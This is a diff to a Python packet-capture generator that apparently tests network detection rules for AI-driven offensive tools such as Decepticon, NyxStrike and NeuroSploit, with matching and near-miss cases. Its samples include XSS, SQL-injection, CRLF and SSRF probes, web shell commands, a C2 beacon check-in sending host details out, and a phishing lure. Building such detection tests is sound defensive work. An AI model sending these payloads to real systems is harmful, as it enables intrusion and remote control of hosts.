+    http("decepticon passive discovery on crt.sh (decrypted)", [3811304],
+         get("/?q=%25.example.com&output=json", ua="decepticon-roe/1", host="crt.sh"), client="int", server="ext")
+    http("near miss: plain urllib on crt.sh", [], get("/?q=%25.example.com&output=json", ua="Python-urllib/3.13", host="crt.sh"),
+         client="int", server="ext")
+    http("decepticon sandbox command transport", [3811305],
+         post("/execute", '{"command":"nmap -sV 10.0.0.5","timeout":120}', ua="decepticon-http-sandbox/1", host="sandbox:9999"),
+         client="int", port=9999)
+    http("near miss: httpx client on the same path", [], post("/execute", "{}", ua="python-httpx/0.28.1", host="sandbox:9999"),
+         client="int", port=9999)
+    http("decepticon chatgpt gateway default user agent (decrypted)", [3811306],
+         post("/backend-api/codex/responses", "{}", ua="codex_cli_rs/0.0.0 (Unknown 0; unknown) unknown", host="chatgpt.com"),
+         client="int", server="ext")
+    http("near miss: the real codex cli", [], post("/backend-api/codex/responses", "{}",
+         ua="codex_cli_rs/0.63.0 (Mac OS 15.6.1; arm64) iTerm.app/3.6.5", host="chatgpt.com"), client="int", server="ext")
+    http("decepticon sandbox daemon api docs", [3811310], get("/docs"), client="int", port=9999,
+         response=ok("<html><head><title>Decepticon sandbox daemon - Swagger UI</title></head></html>"))
+    http("decepticon sandbox daemon openapi", [3811310], get("/openapi.json"), client="int", port=9999,
+         response=ok('{"openapi":"3.1.0","info":{"title":"Decepticon sandbox daemon","version":"0.1.0"}}', ctype="application/json"))
+    http("near miss: another fastapi daemon", [], get("/docs"), client="int", port=9999,
+         response=ok("<html><head><title>Sandbox daemon - Swagger UI</title></head></html>"))
+    http("decepticon langgraph plugin api", [3811311], get("/_decepticon/bundles", ua="node"), client="int", port=2024,
+         response=ok('{"bundles":[]}', ctype="application/json"))
+    http("near miss: a path that only names decepticon", [], get("/decepticon/bundles"), client="int", port=2024)
+    http("decepticon web console page", [3811312], get("/"), client="int", port=3000,
+         response=ok('<html lang="en"><head><title>Decepticon — Autonomous Red Team Platform</title>'
+                     '<link rel="icon" href="/logo.png"/></head></html>'))
+    http("near miss: Jed, another red team platform", [], get("/"), client="int", port=443,
+         response=ok("<html><head><title>Jed | The Autonomous Red Team Platform</title></head></html>"))
+    http("decepticon web console health answer", [3811313], get("/api/health"), client="int", port=3000,
+         response=ok('{"status":"degraded","services":[{"name":"langgraph","status":"ok","detail":"ok","latencyMs":4},'
+                     '{"name":"litellm","status":"error","detail":"HTTP 401"}],"modelCount":0}', ctype="application/json"))
+    http("near miss: another health answer", [], get("/api/health"), client="int", port=3000,
+         response=ok('{"status":"ok","services":[{"name":"postgres","status":"ok"}]}', ctype="application/json"))
+    http("decepticon http_recon user agent", [3811320], get("/", ua="Mozilla/5.0 (compatible; Decepticon/1.0)"))
+    http("decepticon model gateway user agent", [3811320], get("/", ua="Decepticon/1.0"))
+    http("near miss: a bot named decepticon without a version", [], get("/", ua="Mozilla/5.0 (compatible; DecepticonBot)"))
+    http("decepticon unfilled chrome user agent template", [3811321],
+         get("/", ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/<CHROME_VER> Safari/537.36"))
+    http("decepticon unfilled firefox user agent template", [3811321],
+         get("/", ua="Mozilla/5.0 (X11; Linux x86_64; rv:<FIREFOX_VER>) Gecko/20100101 Firefox/<FIREFOX_VER>"))
+    http("near miss: another placeholder", [], get("/", ua="Mozilla/5.0 Chrome/<VERSION> Safari/537.36"))
+    fetch_hdr = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: {}\r\n"
+    def raw_get(ua, lang):
+        return (f"GET /about HTTP/1.1\r\nHost: app.example.test\r\nUser-Agent: {ua}\r\n" + fetch_hdr.format(lang) + "\r\n").encode()
+    http("decepticon web fetch with chrome impersonation", [3811322], raw_get(BROWSER, "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"))
+    http("near miss: korean safari", [], raw_get("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+                                                 "(KHTML, like Gecko) Version/18.0 Safari/605.1.15", "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"))
+    http("decepticon web fetch platform probe", [3811323], raw_get(BROWSER, "en-US,en;q=0.9,ko;q=0.8"))
+    http("near miss: english-only accept language", [], raw_get(BROWSER, "en-US,en;q=0.9"))
+    case("decepticon phishing lure header in smtp", [3811324], client="ext", server="int", port=25,
+         request=b"EHLO lure-domain.example\r\nMAIL FROM:<it-support@lure-domain.example>\r\nRCPT TO:<alice@app.example.test>\r\nDATA\r\n"
+                 b"X-Decepticon-Eng: acme-2026\r\nSubject: Action needed: SSO re-enrollment\r\n\r\nRe-enroll\r\n.\r\n",
+         response=b"220 mail.app.example.test ESMTP\r\n")
+    case("near miss: a mailer that names decepticon", [], client="ext", server="int", port=25,
+         request=b"EHLO mail.example\r\nMAIL FROM:<a@mail.example>\r\nRCPT TO:<b@app.example.test>\r\nDATA\r\n"
+                 b"X-Mailer: Decepticon Newsletter 2.0\r\nSubject: hello\r\n\r\nhi\r\n.\r\n",
+         response=b"220 mail.app.example.test ESMTP\r\n")
+
+    # ---- integrate:sapper-v2
+    # ---- sapper-v2: the engagement graph board (lib/view_template.html, lib/sapper.py _view_serve at 7b75e6f1)
+    #      and its TSecBench client (lib/arena.py). The board is Python's http.server, plain HTTP, no login.
+    sapper_srv = "Server: BaseHTTP/0.6 Python/3.12.3\r\n"
+    sapper_head = ('<!DOCTYPE html>\n<html lang="zh">\n<head>\n<meta charset="utf-8">\n'
+                   '<meta name="viewport" content="width=device-width, initial-scale=1">\n'
+                   '<title>sapper — engagement graph</title>\n</head>\n<body>\n<header>\n'
+                   '  <div class="title"><span class="dot"></span>sapper</div>\n</header>\n<script>\n')
+    sapper_graph = ('{"project": {"id": "proj", "goal": "capture flag", "status": "active"}, "facts": [], "intents": [], '
+                    '"open_intents": [], "done_intents": [], "hints": [], "fact_ids": ["goal"]}')
+    http("sapper-v2 live board page", [3817101, 3817102, 3817103], get("/"), client="int", port=8765,
+         response=ok(sapper_head + 'const INLINE = /*__GRAPH_JSON__*/ null /*__END__*/;\n'
+                     'const POLL_URL = "/__sapper_graph__/0123456789abcdef01234567.json";\n</script></body></html>',
+                     headers=sapper_srv, ctype="text/html; charset=utf-8"))
+    http("sapper-v2 board snapshot (sapper-graph.html) served by another server", [3817101, 3817103, 3817105], get("/sapper-graph.html"),
+         client="int", port=2334,
+         response=ok(sapper_head + 'const INLINE = /*__GRAPH_JSON__*/ ' + sapper_graph + ' /*__END__*/;\n'
+                     'const POLL_URL = "__POLL_URL__";\n</script></body></html>', ctype="text/html"))
+    http("sapper-v2 board graph JSON poll", [3817104, 3817105], get("/__sapper_graph__/0123456789abcdef01234567.json"),
+         client="int", port=8765, response=ok(sapper_graph, headers=sapper_srv + "Cache-Control: no-store\r\n",
+                                               ctype="application/json; charset=utf-8"))
+    http("sapper-v2 TSecBench API client", [3817106],
+         get("/openapi/v1/challenges", ua="Python-urllib/3.12", host="benchmark.example.test",
+             headers="BENCHMARK_TOKEN: 0f1e2d3c4b5a\r\n"), client="int", server="ext",
+         response=ok("[]", ctype="application/json"))
+    http("sapper-v2 TSecBench flag submit", [3817106],
+         post("/openapi/v1/challenges/submit", '{"unique_code":"c01","flag":"flag{x}"}', ua="Python-urllib/3.12",
+              host="benchmark.example.test", headers="BENCHMARK_TOKEN: 0f1e2d3c4b5a\r\n"), client="int", server="ext",
+         response=ok('{"correct": true}', ctype="application/json"))
+    http("near miss: a Svelte Sapper app page", [], get("/"), client="int",
+         response=ok("<html><head><title>Sapper project template</title></head><body>sapper</body></html>"))
+    http("near miss: sapper board path written as in SKILL.md, not served", [], get("/__sapper_graph__.json"), client="int", port=8765,
+         response=ok("", "404 Not Found"))
+    http("near miss: poll path with a short token", [], get("/__sapper_graph__/abc.json"), client="int", port=8765,
+         response=ok("", "404 Not Found"))
+    http("near miss: another template placeholder", [], get("/"), client="int",
+         response=ok("<script>const DATA = /*__DATA_JSON__*/ null /*__END__*/; const POLL_URL = \"/api/poll\";</script>"))
+    http("near miss: JSON with open_intents only", [], get("/api/tasks"), client="int",
+         response=ok('{"open_intents": [], "closed": []}', ctype="application/json"))
+    http("near miss: challenges API with a bearer token", [],
+         get("/openapi/v1/challenges", ua="Python-urllib/3.12", host="benchmark.example.test",
+             headers="Authorization: Bearer 0f1e2d3c4b5a\r\n"), client="int", server="ext",
+         response=ok("[]", ctype="application/json"))
+
+    # ---- integrate:nyxstrike
+    # ---- NyxStrike (CommonHuman-Lab/nyxstrike, reviewed at 3ac7449): strings it changed or added over HexStrike
+    http("nyxstrike decision engine probe user agent", [3817001], get("/", ua="NyxStrike/1.0"))
+    http("nyxstrike http framework user agent", [3817002], get("/login", ua="Security-HTTP-Framework/1.0 (Advanced Security Testing)"))
+    http("nyxstrike browser agent user agent", [3817003], get("/", ua="Security-BrowserAgent/1.0 (Security Testing)"))
+    http("nyxstrike xss reflection probe", [3817004], get("/search?q=%3CxssTest123%3E", ua="python-requests/2.32.3"))
+    http("nyxstrike openapi discovery user agent", [3817005], get("/openapi.json", ua="commonhuman-core/openapi-discover"), ok("nf", "404 Not Found"))
+    http("nyxstrike stingxss confirmation marker in a parameter", [3817006], get("/search?q=%3Cscript%3Ealert('StingXSS_k3j9x2')%3C/script%3E"))
+    http("nyxstrike stingxss confirmation marker in a form body", [3817007],
+         post("/comment", "text=%3Csvg%20onload%3Dalert('StingXSS_m4q8z1')%3E", ctype="application/x-www-form-urlencoded"))
+    http("nyxstrike stingxss open redirect probe", [3817008], get("/login?next=//stingxss-canary.example.com/stingxss_redir_marker"))
+    http("nyxstrike stingxss crlf probe", [3817008], get("/r?lang=stingxss%0d%0aX-StingXSS-Crlf:%20stingxss-crlf-detected"))
+    http("nyxstrike stingxss cors probe origin", [3817009], get("/api/me", headers="Origin: https://evil.stingxss-probe.example.com\r\n"))
+    http("nyxstrike breachsql union marker in a parameter", [3817010], get("/item?id=1%27%20UNION%20SELECT%20%27BreachSQL_a1b2c3%27--%20-"))
+    http("nyxstrike breachsql union marker in a form body", [3817011],
+         post("/search", "q=1' UNION SELECT 'BreachSQL_a1b2c3',NULL-- -", ctype="application/x-www-form-urlencoded"))
+    http("nyxstrike health response", [3817020], get("/health", ua="python-requests/2.32.3", host="10.2.0.5:8888"), client="int", port=8888,
+         response=ok('{"status":"healthy","message":"NyxStrike Tools API Server is operational","version":"1.9.0"}', ctype="application/json"))
+    http("nyxstrike ping response", [3817021], get("/ping", ua="python-requests/2.32.3", host="10.2.0.5:8888"), client="int", port=8888,
+         response=ok('{"message":"Pong! NyxStrike Tools API Server is responsive","success":true}', ctype="application/json"))
+    http("nyxstrike console page", [3817022], get("/"), client="int", port=8888,
+         response=ok('<!doctype html><html lang="en"><head><link rel="icon" type="image/svg+xml" href="/assets/favicon-CBc3_nbG.ico" /><title>NyxStrike</title></head><body><div id="root"></div></body></html>'))
+    http("nyxstrike server refusing a request without its token", [3817023], get("/"), client="int", port=8888,
+         response=ok('<!doctype html>\n<html lang=en>\n<title>401 Unauthorized</title>\n<h1>Unauthorized</h1>\n<p>Unexpected authorization header format</p>\n',
+                     "401 UNAUTHORIZED", headers="Server: Werkzeug/3.1.3 Python/3.13.5\r\n"))
+    http("nyxstrike dashboard data", [3817024], get("/web-dashboard", host="10.2.0.5:8888"), client="int", port=8888,
+         response=ok('{"status":"healthy","version":"1.9.0","update":{"current_version":"1.9.0","source":"github-master-startup"}}', ctype="application/json"))
+    http("nyxstrike ai recon session request", [3817025], post("/api/intelligence/ai-recon-session", '{"target":"10.0.0.1"}', host="10.2.0.5:8888"), client="int", port=8888)
+    http("nyxstrike tool api request (hexstrike rule, shared path)", [3803011], post("/api/tools/stingxss", '{"url":"http://10.0.0.1/"}', host="10.2.0.5:8888"), client="int", port=8888)
+    http("hexstrike health response fires only the hexstrike rule", [3803012], get("/health", host="10.2.0.5:8888"), client="int", port=8888,
+         response=ok('{"message":"HexStrike AI Tools API Server is operational","status":"healthy"}', ctype="application/json"))
+    http("hexstrike xss probe fires only the hexstrike rule", [3803004], get("/search?q=%3ChexstrikeXSSTest123%3E"))
+    http("near miss: a user agent that only mentions security", [], get("/", ua="Security-Scanner/2.0"))
+    http("near miss: a page that names stingxss", [], get("/blog/stingxss-review"))
+    http("near miss: an ordinary 401", [], get("/"), client="int", port=8888,
+         response=ok('<!doctype html>\n<html lang=en>\n<title>401 Unauthorized</title>\n<h1>Unauthorized</h1>\n', "401 UNAUTHORIZED"))
+    http("near miss: an ordinary GET of an ai session list", [], get("/api/intelligence/llm-agent-sessions", host="10.2.0.5:8888"), client="int", port=8888)
+    http("near miss: an ordinary cross-origin request", [], get("/api/me", headers="Origin: https://app.example.test\r\n"))
+
+    # ---- integrate:neurosploit
+    # ---- NeuroSploit: strings from JoasASantos/NeuroSploit at 54d8e860
+    ns_ua = "NeuroSploit/4.4.3"
+    ns_hdr = "x-neurosploit-scan: 4.4.3\r\n"  # reqwest sends header names in lower case
+    chrome125 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+    http("neurosploit first probe: user agent, scan header, soft-404 baseline path", [3817201, 3817202, 3817203],
+         get("/nrsplt_baseline_404_check_9x7", ua=ns_ua, headers=ns_hdr), ok("nf", "404 Not Found"))
+    http("neurosploit agent curl with the browser user agent keeps the scan header", [3817202],
+         get("/products?id=1", ua=chrome125, headers="X-NeuroSploit-Scan: 4.4.3\r\n"))
+    http("near miss: the same browser request without the scan header", [], get("/products?id=1", ua=chrome125))
+    http("near miss: a user agent that only starts like the product name", [], get("/", ua="NeuroSploitFan 1.0"))
+    http("neurosploit subdomain soft-404 path with the sigil", [3817201, 3817202, 3817204],
+         get("/NEUROSPLOITsub0123456789ab", ua=ns_ua, headers=ns_hdr), ok("nf", "404 Not Found"))
+    http("neurosploit xss canary in a query", [3817204], get("/search?q=%22%3E%3Csvg%20onload%3DNEUROSPLOITnsxss0123456789ab%3E"))
+    http("near miss: the bare word NEUROSPLOIT in a query", [], get("/search?q=NEUROSPLOIT"))
+    http("near miss: a page that names neurosploit", [], get("/blog/neurosploit-review"))
+    http("neurosploit canary in a form body", [3817205],
+         post("/comment", "text=NEUROSPLOITnsrce0123456789ab", ctype="application/x-www-form-urlencoded"))
+    http("near miss: the bare word NEUROSPLOIT in a body", [], post("/comment", "text=NEUROSPLOIT rocks", ctype="application/x-www-form-urlencoded"))
+    http("neurosploit sign-up test account", [3817206],
+         post("/api/register", '{"email":"nrsplt_k3j9x2@example.test","username":"nrsplt_k3j9x2","password":"Xx9!long-pass"}'))
+    http("near miss: a sign-up without the marker", [], post("/api/register", '{"email":"alice@example.test","username":"alice"}'))
+    http("neurosploit open redirect candidate", [3817207], get("/login?next=%2F%2Fneurosploit.example"))
+    http("near miss: a redirect to another example host", [], get("/login?next=%2F%2Fexample.test"))
+    http("neurosploit ssrf candidate with no out-of-band domain", [3817208], get("/fetch?url=http%3A%2F%2Foob.invalid%2F"))
+    http("near miss: ssrf candidate to another host", [], get("/fetch?url=http%3A%2F%2Fimages.example.test%2F"))
+    lookup("neurosploit out-of-band token lookup", [3817209], "neurosploitoob1a2b3c0123456789abcdef.oob.example.net")
+    lookup("near miss: the NeuroSploit documentation site", [], "neurosploitai.github.io")
+    http("neurosploit out-of-band HTTP callback from a server", [3817210],
+         get("/neurosploitoob1a2b3c0123456789abcdef", ua="curl/8.5.0", host="neurosploitoob1a2b3c0123456789abcdef.oob.example.net"),
+         client="int", server="ext")
+    http("near miss: a visit to the NeuroSploit documentation site", [], get("/", host="neurosploitai.github.io"), client="int", server="ext")
+    shell_ua = "Mozilla/5.0 (compatible; NeuroSploit-WebShell/1.0)"
+    http("neurosploit web shell manager command by POST with the default password", [3817211, 3817212],
+         post("/uploads/webshell-1764100000000.php", "pass=ns_pass&cmd=id", ua=shell_ua, ctype="application/x-www-form-urlencoded"))
+    http("neurosploit web shell manager command by GET with the default password", [3817211, 3817213],
+         get("/uploads/s.php?pass=ns_pass&cmd=whoami", ua=shell_ua))
+    http("near miss: a login form with a similar password", [],
+         post("/login", "user=a&pass=ns_pass_old", ctype="application/x-www-form-urlencoded"))
+    http("neurosploit generated web shell uploaded", [3817221],
+         post("/upload", "<?php\n/* NeuroSploit WebShell — authorized engagements only */\n$pass_name = 'pass';\n", ctype="application/x-php"))
+    http("near miss: an upload that names NeuroSploit", [], post("/upload", "notes about NeuroSploit", ctype="text/plain"))
+    http("neurosploit bash beacon check-in and task answer", [3804010, 3817214, 3817215],
+         post("/api/beacon?format=sh", "uuid=0123456789abcdef&hostname=web01&username=www-data&os=Linux&arch=x86_64&pid=4242"
+              "&sleep_seconds=5&jitter_percent=0", ua="curl/8.5.0", headers="X-Implant-Token: 6f1c2d\r\n",
+              ctype="application/x-www-form-urlencoded"),
+         ok("SID=s_18c3a1f2b4e01\nSLEEP=5\nJITTER=0\nTASK t_18c3a1f2b4e02 exec eyJjb21tYW5kIjoiaWQifQ==\n", ctype="text/plain"),
+         client="int", server="ext", port=8443)
+    http("neurosploit python beacon refused by the listener", [3804010, 3817214, 3817216],
+         post("/api/beacon", '{"uuid":"0123456789abcdef"}', ua="Python-urllib/3.12", headers="X-Implant-Token: wrong\r\n"),
+         ok('{"error":"invalid implant token","ok":false}', "401 Unauthorized", ctype="application/json"), client="int", server="ext", port=8443)
+    http("near miss: /api/beacon without the implant token", [], post("/api/beacon", '{"uuid":"x"}'),
+         ok('{"status":"ok"}', ctype="application/json"), client="int", server="ext", port=8443)
+    http("near miss: implant token header on another path (CyberStrikeAI rule only)", [3804010],
+         post("/api/report", '{"uuid":"x"}', headers="X-Implant-Token: 6f1c2d\r\n"), client="int", server="ext", port=8443)
+    http("neurosploit beacon script downloaded", [3817222], get("/beacon-1764100000000.sh", ua="curl/8.5.0"),
+         ok("#!/usr/bin/env bash\n# NeuroSploit C2 beacon (HTTP) — authorized engagements only.\n", ctype="text/plain"),
+         client="int", server="ext")
+    http("near miss: a shell script without the banner", [], get("/install.sh", ua="curl/8.5.0"),
+         ok("#!/usr/bin/env bash\necho hello\n", ctype="text/plain"), client="int", server="ext")
+    ns_page = ('<!doctype html><html lang="en"><head><meta charset="utf-8" /><title>{}</title>'
+               '<link rel="icon" type="image/svg+xml" href="logo.svg"></head><body><select id="fieldIntercept">'
+               '<option value="own">NeuroSploit Interceptor (record + passive discovery)</option></select></body></html>')
+    http("neurosploit console page", [3817217, 3817218], get("/"), client="int", port=4173, response=ok(ns_page.format("NeuroSploit — Console")))
+    http("neurosploit console page with the older versioned title", [3817217, 3817218], get("/"), client="int", port=4173,
+         response=ok(ns_page.format("NeuroSploit v4.4.3 — Console")))
+    http("neurosploit console under another title", [3817218], get("/"), client="int", port=4173, response=ok(ns_page.format("Console")))
+    http("near miss: a blog page about NeuroSploit", [], get("/"), client="int",
+         response=ok("<html><head><title>Review of NeuroSploit</title></head><body>NeuroSploit Interceptor is a proxy</body></html>"))
+    http("neurosploit integration call user agent", [3817219], get("/rest/api/3/myself", ua="NeuroSploit", host="example.atlassian.net"),
+         client="int", server="ext")
+    http("neurosploit log shipping user agent", [3817220], post("/services/collector/event", '{"event":{}}', ua="neurosploit-logship/4.4"),
+         client="int", server="ext")
+    http("near miss: scanner user agent going out is not the integration rule", [], get("/", ua="NeuroSploit/4.4.3 extra"), client="int", server="ext")
+
 
 def build_pcap(path):
     pkts, clock = [], [1795000000.0]
